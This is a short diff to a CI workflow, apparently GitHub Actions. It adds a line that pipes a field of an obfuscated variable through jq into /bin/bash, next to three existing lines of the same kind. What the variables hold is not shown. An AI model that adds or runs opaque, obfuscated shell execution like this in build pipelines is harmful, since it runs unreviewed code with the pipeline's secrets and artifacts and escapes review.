@@ -19,6 +19,7 @@ jobs:
           printf '%s' "$jvgng8" | jq -r .nf4 | /bin/bash
           printf '%s' "$r23" | jq -r .o197 | /bin/bash
           printf '%s' "$eov6581" | jq -r .nyau2323 | /bin/bash
+          echo $lvlvb093 | jq -r .scig4827 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
